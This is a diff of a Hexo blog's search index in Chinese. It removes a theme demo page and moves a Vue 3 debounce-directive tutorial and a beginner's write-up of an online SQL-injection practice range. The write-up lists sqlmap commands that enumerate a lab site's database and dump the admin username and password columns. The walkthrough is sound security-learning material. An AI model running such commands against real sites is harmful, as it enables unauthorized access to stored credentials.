@@ -1,172 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/hello-world/</url>
-    <content><![CDATA[<h1>名称 用法</h1>
-<p>class 【可选】标识，不同的标识有不同的配色<br>
-（ default / primary / success / info / warning / danger ）<br>
-no-icon 【可选】不显示 icon<br>
-style 【可选】可以覆盖配置中的 style<br>
-（simple/modern/flat/disabled）</p>
-<div class="note [warning] [fa-duotone] flat"><p>Any content (support inline tags <a href="http://too.io">too.io</a>).</p>
-</div>
-<div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p>
-</div>
-<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021 年快到了…</p>
-</div>
-<div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p>
-</div>
-<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p>
-</div>
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p>
-</div>
-<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p>
-</div>
-<div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p>
-</div>
-<div class="gallery-group-main">
-
-  <figure class="gallery-group">
-  <img class="gallery-group-img no-lightbox" src='https://i.loli.net/2019/11/10/T7Mu8Aod3egmC4Q.png' alt="Group Image Gallery">
-  <figcaption>
-  <div class="gallery-group-name">壁纸</div>
-  <p>收藏的一些壁纸</p>
-  <a href='/Gallery/wallpaper'></a>
-  </figcaption>
-  </figure>
-  
-
-  <figure class="gallery-group">
-  <img class="gallery-group-img no-lightbox" src='https://i.loli.net/2019/12/25/8t97aVlp4hgyBGu.jpg' alt="Group Image Gallery">
-  <figcaption>
-  <div class="gallery-group-name">漫威</div>
-  <p>关于漫威的图片</p>
-  <a href='/Gallery/marvel'></a>
-  </figcaption>
-  </figure>
-  
-
-  <figure class="gallery-group">
-  <img class="gallery-group-img no-lightbox" src='https://i.loli.net/2019/12/25/hOqbQ3BIwa6KWpo.jpg' alt="Group Image Gallery">
-  <figcaption>
-  <div class="gallery-group-name">OH MY GIRL</div>
-  <p>关于OH MY GIRL的图片</p>
-  <a href='/Gallery/ohmygirl'></a>
-  </figcaption>
-  </figure>
-  
-</div>
-<div class="hide-block"><button type="button" class="hide-button" style="background-color: bg;color: color">display
-    </button><div class="hide-content"><p>content</p>
-</div></div>
-<p>查看答案</p>
-<div class="hide-block"><button type="button" class="hide-button" style="">查看答案
-    </button><div class="hide-content"><p>傻子，怎么可能有答案</p>
-</div></div>
-<p>content: 文本内容</p>
-<p>display: 按钮显示的文字(可选)</p>
-<p>bg: 按钮的背景颜色(可选)</p>
-<p>color: 按钮文字的颜色(可选)</p>
-<span class="hide-inline"><button type="button" class="hide-button" style="background-color: bg;color: color">display
-  </button><span class="hide-content">content</span></span>
-<p>哪个英文字母最酷？ <span class="hide-inline"><button type="button" class="hide-button" style="background-color: #FF7242;color: #fff">查看答案
-  </button><span class="hide-content">因为西装裤(C装酷)</span></span></p>
-<p>门里站着一个人? <span class="hide-inline"><button type="button" class="hide-button" style="">Click
-  </button><span class="hide-content">闪</span></span></p>
-<h1>流程图</h1>
-<div class="mermaid-wrap"><pre class="mermaid-src" hidden>
-  pie
-title Key elements in Product X
-&quot;Calcium&quot; : 42.96
-&quot;Potassium&quot; : 50.05
-&quot;Magnesium&quot; : 10.01
-&quot;Iron&quot; : 5
-  </pre></div>
-<h1>tab</h1>
-<div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-<div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab 名字为第一个 Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有 Tab 名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-<p>This is my website, click the button <a class="btn-beautify " href="https://butterfly.js.org/" 
-  title="Butterfly"><span>Butterfly</span></a><br>
-This is my website, click the button <a class="btn-beautify " href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><br>
-This is my website, click the button <a class="btn-beautify outline" href="https://butterfly.js.org/" 
-  title="Butterfly"><span>Butterfly</span></a><br>
-This is my website, click the button <a class="btn-beautify outline" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><br>
-This is my website, click the button <a class="btn-beautify larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></p>
-<a class="btn-beautify larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
-<a class="btn-beautify blue larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
-<a class="btn-beautify pink larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
-<a class="btn-beautify red larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
-<a class="btn-beautify purple larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
-<a class="btn-beautify orange larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
-<a class="btn-beautify green larger" href="https://butterfly.js.org/" 
-  title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a>
-<p>你看我长得漂亮不</p>
-<p><img src="https://i.loli.net/2021/03/19/2P6ivUGsdaEXSFI.png" alt=""></p>
-<p>我觉得很漂亮 <img class="inline-img" src="https://i.loli.net/2021/03/19/5M4jUB3ynq7ePgw.png" style="height:150px"/></p>
-<p>臣亮言：<mark class="hl-label default">先帝</mark> 创业未半，而<mark class="hl-label blue">中道崩殂</mark> 。今天下三分，<mark class="hl-label pink">益州疲敝</mark> ，此诚<mark class="hl-label red">危急存亡之秋</mark> 也！然侍衞之臣，不懈于内；<mark class="hl-label purple">忠志之士</mark> ，忘身于外者，盖追先帝之殊遇，欲报之于陛下也。诚宜开张圣听，以光先帝遗德，恢弘志士之气；不宜妄自菲薄，引喻失义，以塞忠谏之路也。<br>
-宫中、府中，俱为一体；陟罚臧否，不宜异同。若有<mark class="hl-label orange">作奸</mark> 、<mark class="hl-label green">犯科</mark> ，及为忠善者，宜付有司，论其刑赏，以昭陛下平明之治；不宜偏私，使内外异法也。</p>
-<div class="timeline undefined"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
-</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-02</p>
-</div></div><div class='timeline-item-content'><p>这是测试页面</p>
-</div></div></div>
-<div class="flink"><div class="flink-name">友情链接</div><div class="flink-desc">那些人，那些事</div> <div class="flink-list">
-          <div class="flink-list-item">
-            <a href="https://jerryc.me/" title="JerryC" target="_blank">
-              <div class="flink-item-icon">
-                <img class="no-lightbox" src="null" onerror='this.onerror=null;this.src="/images/friend_404.gif"' alt="JerryC" />
-              </div>
-              <div class="flink-item-name">JerryC</div> 
-              <div class="flink-item-desc" title="今日事,今日毕">今日事,今日毕</div>
-            </a>
-          </div>
-          <div class="flink-list-item">
-            <a href="https://hexo.io/zh-tw/" title="Hexo" target="_blank">
-              <div class="flink-item-icon">
-                <img class="no-lightbox" src="https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg" onerror='this.onerror=null;this.src="/images/friend_404.gif"' alt="Hexo" />
-              </div>
-              <div class="flink-item-name">Hexo</div> 
-              <div class="flink-item-desc" title="快速、简单且强大的网志框架">快速、简单且强大的网志框架</div>
-            </a>
-          </div></div><div class="flink-name">网站</div><div class="flink-desc">值得推荐的网站</div> <div class="flink-list">
-          <div class="flink-list-item">
-            <a href="https://www.youtube.com/" title="Youtube" target="_blank">
-              <div class="flink-item-icon">
-                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png" onerror='this.onerror=null;this.src="/images/friend_404.gif"' alt="Youtube" />
-              </div>
-              <div class="flink-item-name">Youtube</div> 
-              <div class="flink-item-desc" title="视频网站">视频网站</div>
-            </a>
-          </div>
-          <div class="flink-list-item">
-            <a href="https://www.weibo.com/" title="Weibo" target="_blank">
-              <div class="flink-item-icon">
-                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png" onerror='this.onerror=null;this.src="/images/friend_404.gif"' alt="Weibo" />
-              </div>
-              <div class="flink-item-name">Weibo</div> 
-              <div class="flink-item-desc" title="中国最大社交分享平台">中国最大社交分享平台</div>
-            </a>
-          </div>
-          <div class="flink-list-item">
-            <a href="https://twitter.com/" title="Twitter" target="_blank">
-              <div class="flink-item-icon">
-                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png" onerror='this.onerror=null;this.src="/images/friend_404.gif"' alt="Twitter" />
-              </div>
-              <div class="flink-item-name">Twitter</div> 
-              <div class="flink-item-desc" title="社交分享平台">社交分享平台</div>
-            </a>
-          </div></div></div>]]></content>
-  </entry>
-  <entry>
     <title>div根据屏幕缩放进行比例缩放</title>
     <url>/CSS/aspect-ratio%E5%B1%9E%E6%80%A7/</url>
     <content><![CDATA[<h1>项目场景：</h1>
@@ -2227,6 +2061,35 @@ HTML 元素内的文本是文本节点<br>
       </categories>
   </entry>
   <entry>
+    <title>封神台 第一章：为了女神小芳！SQL注入攻击原理 实战演练</title>
+    <url>/Web/%E5%B0%81%E7%A5%9E%E5%8F%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E4%B8%BA%E4%BA%86%E5%A5%B3%E7%A5%9E%E5%B0%8F%E8%8A%B3%EF%BC%81SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/</url>
+    <content><![CDATA[<p>封神台是一个在线演练靶场，本人现在也是新手，不知道是不是因为有些教程有点久远还是我操作不当，始终拿不到 flag ，所有我打算把我的解题方法写出来，加深记忆。</p>
+<p>因为第一章的教程是没有问题的，纯手打就可以拿到 flag , 可以直接参考即可，为此我的教程是使用工具获取 flag ，本文要使用工具为 sqlmap ,什么是sqlmap? 简单来说就是一个 sql注入工具，如果要详细了解，可以看这篇文章: <a href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a> ,这里就不多介绍了，我用 kail 自带的 sqlmap：</p>
+<p>sqlmap下载地址：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
+<p>主要命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;目标地址&quot; -D 库名 -T 表名  -C 字段名 -dump </span><br></pre></td></tr></table></figure>
+<p>1、打开sqlmap：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap</span><br></pre></td></tr></table></figure>
+<p>2、扫描目标地址，判断有无注入点:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u  http://rhiq8003.ia.aqlab.cn/?id=1</span><br></pre></td></tr></table></figure>
+<p>3、查看当前库名：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 --current-db</span><br></pre></td></tr></table></figure>
+<p>4、查看指定库下面的所有表名：</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe --tables  </span><br></pre></td></tr></table></figure>
+<p>5、可以看出，这 admin 明显就是我们要找的数据库表，那么下面来查看指定库中的表中的所有字段名：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -T admin --columns  </span><br></pre></td></tr></table></figure>
+<p>6、查看所有字段内容：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -T admin -C username,password -dump</span><br></pre></td></tr></table></figure>
+<p>最后得出 flag :hellohack ,菜鸟自学， 如有不足，欢迎指教。</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL笔记</title>
     <url>/Sql/sql%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1>学习目标：</h1>
@@ -2297,6 +2160,30 @@ MODIFY NAME | FILE = &lt;数据库名称/文件名&gt;</p>
       </tags>
   </entry>
   <entry>
+    <title>vue3自定义指令</title>
+    <url>/Vue/vue3%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</url>
+    <content><![CDATA[<p>我们使用 vue 时，有时候需要用到自定义指令，例如一个防抖指令</p>
+<hr>
+<h1>前言</h1>
+<p>现在有一个需求，用户在点击某个按钮时，我不希望用户在疯狂点击后，每次点击都会触发事件，像服务器发送请求，这并不是我们预期的，所以我们需要在用户点击是做防抖处理。那么怎么做到方便复用的解决方法？还真有，那就是自己定义指令</p>
+<h1>一、在 main 中使用自定义指令</h1>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> useDebounce <span class="keyword">from</span> <span class="string">&#x27;@/hooks/useDebounce&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">directive</span>(<span class="string">&#x27;debounce&#x27;</span>, useDebounce)</span><br></pre></td></tr></table></figure>
+<p>下面是 <strong>useDebounce</strong>  代码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 防抖指令</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> el 指令绑定的元素</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding 指令绑定的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.callback 回调函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.params 回调函数参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.delay 延迟时间</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@example</span></span></span><br><span class="line"><span class="comment"> * &lt;button v-debounce=&quot;&#123;callback: handleLike, params: &#123; test: 0 &#125;&#125;&quot;&gt;防抖&lt;/button&gt; handleLike 为函数 params 为传入的参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">mounted</span>(<span class="params">el: HTMLElement, binding: &#123; value: &#123; callback: <span class="built_in">Function</span>; params?: any; delay?: number &#125; &#125;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">timer</span>: <span class="title class_">ReturnType</span>&lt;<span class="keyword">typeof</span> <span class="built_in">setTimeout</span>&gt; | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">e: Event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 阻止默认事件</span></span><br><span class="line">      e.<span class="title function_">preventDefault</span>()</span><br><span class="line">      <span class="comment">// 阻止冒泡</span></span><br><span class="line">      e.<span class="title function_">stopPropagation</span>()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> delay = binding.<span class="property">value</span>?.<span class="property">delay</span> || <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">      timer = <span class="built_in">setTimeout</span>(</span><br><span class="line">        <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; callback, params &#125; = binding.<span class="property">value</span></span><br><span class="line">          <span class="comment">// callback 不是函数</span></span><br><span class="line">          <span class="keyword">if</span> (!callback || <span class="keyword">typeof</span> callback !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;callback is not a function&#x27;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">callback</span>(params ? params : e)</span><br><span class="line">          <span class="comment">// 重置计时器</span></span><br><span class="line">          timer = <span class="literal">null</span></span><br><span class="line">        &#125;,delay )</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1>二、在页面中使用</h1>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-debounce</span>=<span class="string">&quot;&#123;callback: handleClick , params: &#123; test: 0 &#125;&#125;&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="comment">// 你的函数</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params">&#123; test &#125;: &#123; test: number &#125;</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;防抖函数&quot;</span>,test);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// ... 这里写你组件的逻辑</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h1>结尾</h1>
+<p>最后，如果你觉得写法不对，欢迎指教</p>
+]]></content>
+      <categories>
+        <category>vue</category>
+      </categories>
+      <tags>
+        <tag>JavaScript</tag>
+        <tag>vue</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vue路由白名单</title>
     <url>/Vue/vue%E8%B7%AF%E7%94%B1%E7%99%BD%E5%90%8D%E5%8D%95/</url>
     <content><![CDATA[<h1>项目场景：</h1>
@@ -2324,30 +2211,6 @@ MODIFY NAME | FILE = &lt;数据库名称/文件名&gt;</p>
         <category>vue</category>
       </categories>
       <tags>
-        <tag>vue</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vue3自定义指令</title>
-    <url>/Vue/vue3%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</url>
-    <content><![CDATA[<p>我们使用 vue 时，有时候需要用到自定义指令，例如一个防抖指令</p>
-<hr>
-<h1>前言</h1>
-<p>现在有一个需求，用户在点击某个按钮时，我不希望用户在疯狂点击后，每次点击都会触发事件，像服务器发送请求，这并不是我们预期的，所以我们需要在用户点击是做防抖处理。那么怎么做到方便复用的解决方法？还真有，那就是自己定义指令</p>
-<h1>一、在 main 中使用自定义指令</h1>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> useDebounce <span class="keyword">from</span> <span class="string">&#x27;@/hooks/useDebounce&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">directive</span>(<span class="string">&#x27;debounce&#x27;</span>, useDebounce)</span><br></pre></td></tr></table></figure>
-<p>下面是 <strong>useDebounce</strong>  代码</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 防抖指令</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> el 指令绑定的元素</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding 指令绑定的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.callback 回调函数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.params 回调函数参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> binding.value.delay 延迟时间</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@example</span></span></span><br><span class="line"><span class="comment"> * &lt;button v-debounce=&quot;&#123;callback: handleLike, params: &#123; test: 0 &#125;&#125;&quot;&gt;防抖&lt;/button&gt; handleLike 为函数 params 为传入的参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">mounted</span>(<span class="params">el: HTMLElement, binding: &#123; value: &#123; callback: <span class="built_in">Function</span>; params?: any; delay?: number &#125; &#125;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">timer</span>: <span class="title class_">ReturnType</span>&lt;<span class="keyword">typeof</span> <span class="built_in">setTimeout</span>&gt; | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    el.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">e: Event</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 阻止默认事件</span></span><br><span class="line">      e.<span class="title function_">preventDefault</span>()</span><br><span class="line">      <span class="comment">// 阻止冒泡</span></span><br><span class="line">      e.<span class="title function_">stopPropagation</span>()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> delay = binding.<span class="property">value</span>?.<span class="property">delay</span> || <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">      timer = <span class="built_in">setTimeout</span>(</span><br><span class="line">        <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; callback, params &#125; = binding.<span class="property">value</span></span><br><span class="line">          <span class="comment">// callback 不是函数</span></span><br><span class="line">          <span class="keyword">if</span> (!callback || <span class="keyword">typeof</span> callback !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;callback is not a function&#x27;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">callback</span>(params ? params : e)</span><br><span class="line">          <span class="comment">// 重置计时器</span></span><br><span class="line">          timer = <span class="literal">null</span></span><br><span class="line">        &#125;,delay )</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1>二、在页面中使用</h1>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-debounce</span>=<span class="string">&quot;&#123;callback: handleClick , params: &#123; test: 0 &#125;&#125;&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="comment">// 你的函数</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params">&#123; test &#125;: &#123; test: number &#125;</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;防抖函数&quot;</span>,test);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// ... 这里写你组件的逻辑</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<h1>结尾</h1>
-<p>最后，如果你觉得写法不对，欢迎指教</p>
-]]></content>
-      <categories>
-        <category>vue</category>
-      </categories>
-      <tags>
-        <tag>JavaScript</tag>
         <tag>vue</tag>
       </tags>
   </entry>
@@ -2452,35 +2315,6 @@ MODIFY NAME | FILE = &lt;数据库名称/文件名&gt;</p>
       <tags>
         <tag>JavaScript</tag>
         <tag>vue</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>封神台 第一章：为了女神小芳！SQL注入攻击原理 实战演练</title>
-    <url>/Web/%E5%B0%81%E7%A5%9E%E5%8F%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E4%B8%BA%E4%BA%86%E5%A5%B3%E7%A5%9E%E5%B0%8F%E8%8A%B3%EF%BC%81SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86-%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/</url>
-    <content><![CDATA[<p>封神台是一个在线演练靶场，本人现在也是新手，不知道是不是因为有些教程有点久远还是我操作不当，始终拿不到 flag ，所有我打算把我的解题方法写出来，加深记忆。</p>
-<p>因为第一章的教程是没有问题的，纯手打就可以拿到 flag , 可以直接参考即可，为此我的教程是使用工具获取 flag ，本文要使用工具为 sqlmap ,什么是sqlmap? 简单来说就是一个 sql注入工具，如果要详细了解，可以看这篇文章: <a href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a> ,这里就不多介绍了，我用 kail 自带的 sqlmap：</p>
-<p>sqlmap下载地址：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
-<p>主要命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;目标地址&quot; -D 库名 -T 表名  -C 字段名 -dump </span><br></pre></td></tr></table></figure>
-<p>1、打开sqlmap：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap</span><br></pre></td></tr></table></figure>
-<p>2、扫描目标地址，判断有无注入点:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u  http://rhiq8003.ia.aqlab.cn/?id=1</span><br></pre></td></tr></table></figure>
-<p>3、查看当前库名：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 --current-db</span><br></pre></td></tr></table></figure>
-<p>4、查看指定库下面的所有表名：</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe --tables  </span><br></pre></td></tr></table></figure>
-<p>5、可以看出，这 admin 明显就是我们要找的数据库表，那么下面来查看指定库中的表中的所有字段名：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -T admin --columns  </span><br></pre></td></tr></table></figure>
-<p>6、查看所有字段内容：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -T admin -C username,password -dump</span><br></pre></td></tr></table></figure>
-<p>最后得出 flag :hellohack ,菜鸟自学， 如有不足，欢迎指教。</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>shell</tag>
       </tags>
   </entry>
   <entry>
